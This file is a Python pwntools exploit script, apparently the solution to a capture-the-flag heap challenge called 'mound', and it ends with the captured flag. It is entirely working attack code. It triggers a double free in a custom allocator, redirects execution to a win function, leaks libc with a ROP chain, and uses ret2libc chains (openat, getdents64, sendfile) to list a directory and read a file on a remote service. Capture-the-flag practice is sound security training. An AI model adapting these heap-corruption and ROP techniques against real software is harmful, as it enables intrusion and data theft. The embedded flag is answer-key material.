#!/usr/bin/env python3
from pwn import *

context.log_level = 'warning'

exe = ELF("./mound-patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")

context.binary = exe

def conn():
    if args.GDB:
        p = gdb.debug(exe.path, env={"LD_PRELOAD": libc.path}, gdbscript="c")
        return p
    elif args.REMOTE:
        return remote("193.57.159.27", 65382)
    return process([exe.path], env={"LD_PRELOAD": libc.path})

def add_strdup(index, data):
    r.sendlineafter(b"> ", b"1")
    r.sendafter(b"Pile: ", data)
    r.sendlineafter(b"Pile index: ", str(index).encode())

def add(size, index, data):
    r.sendlineafter(b"> ", b"2")
    r.sendlineafter(b"Size of pile: ", str(size).encode())
    r.sendlineafter(b"Pile index: ", str(index).encode())
    r.sendlineafter(b"Pile: ", data)

def edit(index, data):
    r.sendlineafter(b"> ", b"3")
    r.sendlineafter(b"Pile index: ", str(index).encode())
    r.sendline(data)

def free(index):
    r.sendlineafter(b"> ", b"4")
    r.sendlineafter(b"Pile index: ", str(index).encode())

def main():
    global r, file
    r = conn()

    add(100, 0, b"/pwn/716b228a42da0c8b248c9e2f801f2c6f.txt\x00")

    # double free
    add_strdup(0, b'A'*0x16 + b'\n')
    add_strdup(1, b'B'*0x16 + b'\n')
    free(1)

    edit(0, b"C"*0x16 + b'\n')
    free(1)

    add(16, 2, p64(0xbeef0000010) + p64(0xdead0007ff8))
    add(16, 2, b'A')
    add(16, 3, p64(0xbeef0000010) + p64(0x00404068))

    add(50, 4, p64(exe.sym.win))
    #

    # leak libc
    rop = ROP(exe)
    pop_rdi = p64(rop.find_gadget(["pop rdi", "ret"]).address)
    r.sendlineafter(b"Exploiting BOF is simple right? ;)\n", b"A"*72 + pop_rdi + p64(exe.got.puts) + p64(exe.sym.puts) + p64(exe.sym.win))
    libc.address = u64(r.recv(6) + b'\x00\x00') - libc.sym.puts
    log.warning("libc base: 0x%x", libc.address)

    # ret2libc
    rop_libc = ROP(libc)
    pop_rsi_r15 = p64(rop.find_gadget(["pop rsi", "pop r15", "ret"]).address)
    pop_rdx_rcx_rbx = p64(rop_libc.find_gadget(["pop rdx", "pop rcx", "pop rbx", "ret"]).address) 

    # openat(/pwn) + getdents + write to leak filename
    # 716b228a42da0c8b248c9e2f801f2c6f.txt
    chain_leakfilename = b"A"*72 + pop_rsi_r15 + p64(0xbeef0000100) + p64(0) + p64(libc.sym.openat) + \
    pop_rdi + p64(3) + pop_rsi_r15 + p64(0xbeef0000000) + p64(0) + pop_rdx_rcx_rbx + p64(1000) + p64(0)*2 + p64(libc.sym.getdents64) + \
    pop_rdi + p64(1) + pop_rsi_r15 + p64(0xbeef0000000) + p64(0) + pop_rdx_rcx_rbx + p64(1000) + p64(0)*2 + p64(libc.sym.write)

    # openat(/pwn/716b228a42da0c8b248c9e2f801f2c6f.txt) + sendfile to read flag
    chain_printflag = b"A"*72 + pop_rsi_r15 + p64(0xbeef0000100) + p64(0) + p64(libc.sym.openat) + \
    pop_rdi + p64(1) + pop_rsi_r15 + p64(3) + p64(0) + pop_rdx_rcx_rbx +  p64(0) + p64(100) + p64(0) + p64(libc.sym.sendfile)

    r.sendlineafter(b"Exploiting BOF is simple right? ;)\n", chain_printflag)

    r.interactive()


if __name__ == "__main__":
    main()

# rarctf{all0c4t0rs_d0_n0t_m1x_e45a1bf0b2}